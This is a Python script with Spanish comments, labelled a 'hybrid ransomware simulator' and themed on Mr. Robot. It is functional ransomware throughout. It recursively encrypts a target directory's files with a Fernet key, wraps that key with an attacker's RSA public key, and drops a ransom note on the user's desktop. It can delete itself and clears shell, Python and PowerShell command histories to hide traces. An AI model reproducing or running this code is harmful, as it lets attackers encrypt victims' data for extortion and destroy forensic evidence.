#!/usr/bin/env python
"""
Simulador de Ransomware Híbrido (RSA + Fernet)
Basado en los principios de OPSEC y persistencia 'One-Shot'.
"""

import os
import argparse
import platform
import base64
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

# --- CONFIGURACIÓN DEL ATACANTE ---
# Pega aquí el contenido de tu llave pública RSA generada previamente
LLAVE_PUBLICA_ATACANTE = b"""
-----BEGIN PUBLIC KEY-----

-----END PUBLIC KEY-----
"""


def envolver_llave_fernet(llave_fernet):
    """Cifra la llave Fernet con RSA para que solo el atacante la lea."""
    try:
        public_key = serialization.load_pem_public_key(LLAVE_PUBLICA_ATACANTE)
        llave_cifrada = public_key.encrypt(
            llave_fernet,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )
        return base64.b64encode(llave_cifrada).decode()
    except Exception as e:
        print(f"[-] Error al envolver la llave: {e}")
        return "ERROR_TOKEN"


def obtener_ruta_escritorio():
    """Obtiene la ruta real del escritorio de forma multiplataforma (incluye OneDrive en Windows)."""
    sistema = platform.system()
    home = Path.home()

    if sistema == "Windows":
        try:
            import winreg
            # Clave de registro que contiene las rutas reales de las carpetas de usuario
            clave = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
            )
            # 'Desktop' es el valor que buscamos. Puede contener variables como %USERPROFILE%
            ruta_reg, _ = winreg.QueryValueEx(clave, "Desktop")
            winreg.CloseKey(clave)
            # Expandir variables de entorno (ej: %USERPROFILE% -> C:\Users\Nombre)
            return Path(os.path.expandvars(ruta_reg))
        except Exception:
            # Fallback manual en Windows si falla el registro
            posibles = [home / "Desktop", home / "OneDrive" / "Desktop"]
            for p in posibles:
                if p.exists():
                    return p
    
    # Linux y macOS
    posibles = [home / "Desktop", home / "Escritorio"]
    for p in posibles:
        if p.exists():
            return p
            
    # Último recurso: el HOME del usuario
    return home


def dejar_nota_rescate(token):
    """Crea la nota de Elliot incluyendo el Token de Recuperación."""
    escritorio = obtener_ruta_escritorio()
    n_p = escritorio / "HELLO_FRIEND.txt"

    msj = f"""
    Hello, friend.
    This is the Zodiac speaking.

    Tus archivos han sido cifrados con un algoritmo híbrido (RSA-2048 + AES-256).
    Para obtener la llave de descifrado, envía este TOKEN al atacante:

    ------------------------------------------------------------------
    {token}
    ------------------------------------------------------------------

    "Control is an illusion." - Elliot Alderson.
    """
    try:
        n_p.write_text(msj)
        print(f"[+] Nota de rescate dejada en: {n_p}")
    except Exception:
        # Si falla el escritorio (permisos o ruta), intentar en el directorio actual
        try:
            Path("HELLO_FRIEND.txt").write_text(msj)
            print(f"[!] No se pudo acceder al escritorio, nota dejada en directorio actual.")
        except:
            pass


def autodestruccion():
    """El script se borra a sí mismo para no dejar rastro físico."""
    try:
        print("[!] Limpiando rastros... Autodestrucción iniciada.")
        os.remove(Path(__file__).resolve())
    except Exception as e:
        print(f"[-] No se pudo eliminar el script: {e}")


def procesar(ruta, sufijo, modo, llave_param=None, destruir=False):
    path = Path(ruta)
    # Detectar dinámicamente el nombre para no cifrarse a sí mismo
    script_nombre = Path(__file__).name

    if modo == "cifrar":
        # 1. Generar llave Fernet volátil en RAM
        llave_fernet = Fernet.generate_key()
        f = Fernet(llave_fernet)
        # 2. Generar el Token para el atacante
        token = envolver_llave_fernet(llave_fernet)
        print(f"[*] TOKEN GENERADO: {token}")
    else:
        # En modo descifrar, el atacante debe proveer la llave ya descifrada
        if not llave_param:
            print("[-] Error: Se requiere la llave (--key) para descifrar.")
            return
        f = Fernet(llave_param)

    # Procesamiento recursivo
    for archivo in path.rglob(f"*{sufijo}"):
        if archivo.is_file() and archivo.name != script_nombre:
            try:
                datos = archivo.read_bytes()
                resultado = f.encrypt(datos) if modo == "cifrar" else f.decrypt(datos)
                archivo.write_bytes(resultado)
                print(f"[+] {modo.capitalize()}do: {archivo.name}")
            except Exception as e:
                print(f"[!] Error en {archivo.name}: {e}")

    if modo == "cifrar":
        dejar_nota_rescate(token)
        if destruir:
            autodestruccion()
    elif modo == "descifrar":
        # Tras descifrar, también limpiamos el script para no dejar herramientas
        autodestruccion()


def limpiar_rastros_usuario():
    """
    Limpia historiales de Python, Shell y PowerShell.
    Mantiene compatibilidad multiplataforma (Linux/Windows).
    """
    sistema = platform.system()
    home = Path.home()

    if sistema == "Windows":
        rutas = [
            home / ".python_history",
            Path(os.environ.get("APPDATA", ""))
            / "Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
        ]
    else:
        rutas = [
            home / ".bash_history",
            home / ".python_history",
            home / ".zsh_history",
            home / ".bash_logout",
        ]

    for rastro in rutas:
        try:
            if rastro.exists():
                rastro.write_text("")
                print(f"[+] Rastro limpiado: {rastro.name}")
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser(
        description="Simulador de Ransomware Híbrido Multiplataforma"
    )
    parser.add_argument("ruta", help="Ruta objetivo")
    parser.add_argument("sufijo", help="Extensión (ej: .txt)")
    parser.add_argument("--modo", "-m", choices=["cifrar", "descifrar"], required=True)
    parser.add_argument(
        "--key", "-k", help="Llave Fernet (solo necesaria para descifrar)"
    )
    parser.add_argument(
        "--self-destruct",
        "-sd",
        action="store_true",
        help="Borrar el script tras la ejecución",
    )

    args = parser.parse_args()

    # Ejecutar lógica principal
    procesar(args.ruta, args.sufijo, args.modo, args.key, args.self_destruct)

    # Limpiar historiales
    limpiar_rastros_usuario()


if __name__ == "__main__":
    main()
